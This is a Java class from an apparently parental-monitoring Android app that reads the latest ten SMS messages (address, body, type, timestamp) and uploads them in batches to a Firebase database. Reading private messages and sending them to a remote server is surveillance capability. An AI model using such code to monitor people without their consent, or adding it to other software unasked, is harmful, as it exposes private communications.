package com.childmonitorai;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;

import java.util.ArrayList;

public class SmsMonitor {
    private FirebaseHelper firebaseHelper;
    private Context context;
    private ArrayList<SmsData> smsDataBatch = new ArrayList<>();

    public SmsMonitor(FirebaseHelper firebaseHelper, Context context) {
        this.firebaseHelper = firebaseHelper;
        this.context = context;
    }

    public void monitorSms() {
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 10");

        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    int addressColumnIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                    int bodyColumnIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
                    int typeColumnIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);
                    int timestampColumnIndex = cursor.getColumnIndex(Telephony.Sms.DATE);

                    if (addressColumnIndex >= 0 && bodyColumnIndex >= 0 && typeColumnIndex >= 0 && timestampColumnIndex >= 0) {
                        String address = cursor.getString(addressColumnIndex);
                        String body = cursor.getString(bodyColumnIndex);
                        String type = cursor.getString(typeColumnIndex);
                        String timestamp = cursor.getString(timestampColumnIndex);

                        // Add the data to the batch
                        smsDataBatch.add(new SmsData(address, body, type, timestamp));

                        // Upload instantly if batch size exceeds limit
                        if (smsDataBatch.size() >= 10) {
                            uploadBatchToFirebase();
                        }
                    }
                }
            } catch (Exception e) {
                Log.e("SmsMonitor", "Error monitoring SMS", e);
            } finally {
                cursor.close();
            }
        }
    }

    public void uploadBatchToFirebase() {
        DatabaseReference smsReference = firebaseHelper.getSmsReference();
        for (SmsData smsData : smsDataBatch) {
            smsReference.push().setValue(smsData);
        }
        smsDataBatch.clear();  // Clear the batch after uploading
    }
}
